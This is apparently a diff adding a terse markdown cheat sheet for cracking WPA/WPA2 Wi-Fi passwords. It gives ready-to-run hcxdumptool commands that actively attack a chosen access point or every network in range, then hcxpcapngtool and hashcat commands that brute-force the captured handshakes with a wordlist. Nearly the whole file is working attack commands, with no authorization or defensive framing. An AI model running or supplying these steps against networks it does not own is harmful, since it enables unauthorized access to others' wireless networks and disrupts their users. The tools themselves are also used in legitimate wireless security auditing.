@@ -1,0 +1,40 @@
+---
+syntax: markdown
+---
+# WPA/WPA2 PSK Cracking
+
+Capture WiFi packets and perform offline brute-force attacks against WPA/WPA2 PSK hashes.
+
+Tools:
+- https://github.com/ZerBea/hcxdumptool
+- https://github.com/ZerBea/hcxtools
+
+## Preparation
+
+- avoid interference from NetworkManager, set wireless interface to be unmanaged
+    wlif=wlp7s0
+    nmcli device set $wlif managed no
+
+- scan and show radio channel assignment to identify target
+    hcxdumptool -i $wlif -F --rcascan=active
+
+## Capture packets and attack
+
+Warning: hcxdumptool will perform active attacks by default
+
+- attack specific target
+    bssid=aabbccddeeff
+    channel=6a
+    hcxdumptool --bpfc="wlan addr1 $bssid or wlan addr2 $bssid or wlan addr3 $bssid" > hcxfilter_$bssid.bpf
+    hcxdumptool -i $wlif --bpf=hcxfilter_$bssid.bpf -c $channel -w hcxdump_$bssid.pcapng
+
+- attack all targets
+    hcxdumptool -i $wlif --rds=1 -F -w hcxdump.pcapng
+
+## Crack hashes
+
+- convert dump file to Hashcat format
+    hcxpcapngtool -o hash.hc22000 hcxdump.pcapng
+
+- crack PSK with Hashcat
+    hashcat -m 22000 -a 0 hash.hc22000 wordlist.txt
